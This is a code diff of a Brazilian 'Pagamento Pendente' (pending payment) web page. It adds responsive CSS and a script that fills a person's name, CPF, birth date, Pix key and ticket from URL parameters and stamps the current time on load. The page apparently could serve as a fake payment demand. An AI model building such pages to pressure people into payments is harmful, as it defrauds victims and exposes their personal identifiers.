@@ -7,21 +7,45 @@
     <title>Pagamento Pendente</title>
     <style>
         body {
-            font-family: 'Rawline', sans-serif;
-            margin: 0;
-            padding: 0;
-            background-color: #eaeaea;
-        }
+    font-family: 'Rawline', sans-serif;
+    margin: 0;
+    padding: 0;
+    background-color: #eaeaea;
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    min-height: 100vh;
+}
 
-        .container {
-            width: 365px;
-            height: 700px;
-            background-color: #D6468E;
-            overflow: hidden;
-            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
-            transform: scale(0.78);
-            margin: -60px 0px 0px -30px;
-        }
+.container {
+    max-width: 365px; /* Limite máximo de largura */
+    width: 100%; /* Permite que cresça até o limite máximo */
+    margin: auto; /* Centraliza na tela quando menor que o max-width */
+    background-color: #D6468E;
+    overflow: hidden;
+    box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
+    border-radius: 10px; /* Adicionado para suavizar as bordas */
+}
+
+/* Ajustes responsivos adicionais para telas menores */
+@media (max-width: 400px) {
+    .container {
+        margin: 20px; /* Adiciona um pouco de espaço nas laterais em telas muito pequenas */
+        transform: none; /* Remove transformação em telas pequenas */
+    }
+
+    .header, .value-date-container, .status-alert, .receiver-info {
+        margin: 10px; /* Menos margem em elementos internos para economizar espaço */
+        padding: 10px; /* Ajusta o padding para economizar espaço */
+    }
+    
+    .value-date label, .value-date p, .status-text, .receiver-info h2, .receiver-info label, .receiver-info p {
+        font-size: smaller; /* Diminui o tamanho da fonte para se adequar a telas menores */
+    }
+}
+
+/* Pode adicionar mais regras aqui para outros ajustes específicos de tamanho */
+
 
         .header {
             background-image: url('https://s3.typebot.io/public/workspaces/clpwrgv88001vlh0fl3wduaqz/typebots/clsoykmoc0001o1a8fuuy3j8r/blocks/z8nhply1ap7tgvjamkhx6gbt?v=1709692314467');
@@ -143,7 +167,60 @@
         </div>
     </div>
     <script>
-        // JavaScript omitted for brevity, remains unchanged.
-    </script>
+            // Função para obter os parâmetros da URL
+            function getQueryParams() {
+                var params = {};
+                var parser = document.createElement('a');
+                parser.href = window.location.href;
+                var query = parser.search.substring(1);
+                var vars = query.split('&');
+                for (var i = 0; i < vars.length; i++) {
+                    var pair = vars[i].split('=');
+                    params[pair[0]] = decodeURIComponent(pair[1]);
+                }
+                return params;
+            }
+        
+            // Função para atualizar a data e a hora
+            function updateDateTime() {
+                var now = new Date();
+                var options = {
+                    day: '2-digit', 
+                    month: '2-digit', 
+                    year: 'numeric', 
+                    hour: '2-digit', 
+                    minute: '2-digit', 
+                    second: '2-digit', 
+                    hour12: false, 
+                    timeZone: 'America/Sao_Paulo'
+                };
+                var dateTimeString = now.toLocaleString('pt-BR', options).replace(',', ''); // Remove a vírgula
+                var [date, time] = dateTimeString.split(' ');
+                document.querySelector('.value-date span:first-child').textContent = date.trim(); // Remove espaços em branco extras
+                document.querySelector('.value-date span:last-child').textContent = time;
+            }
+        
+            // Configura os parâmetros da URL nos campos
+            window.onload = function() {
+                var queryParams = getQueryParams();
+                if (queryParams.nome) {
+                    document.getElementById('nome').textContent = queryParams.nome;
+                }
+                if (queryParams.cpf) {
+                    document.getElementById('cpf').textContent = queryParams.cpf;
+                }
+                if (queryParams.nasc) {
+                    document.getElementById('nasc').textContent = queryParams.nasc;
+                }
+                if (queryParams.pix) {
+                    document.getElementById('pix').textContent = queryParams.pix;
+                }
+                if (queryParams.ticket) {
+                    document.getElementById('ticket').textContent = queryParams.ticket;
+                }
+                // Atualiza a data e a hora ao carregar a página
+                updateDateTime();
+            };
+        </script>
 </body>
 </html>
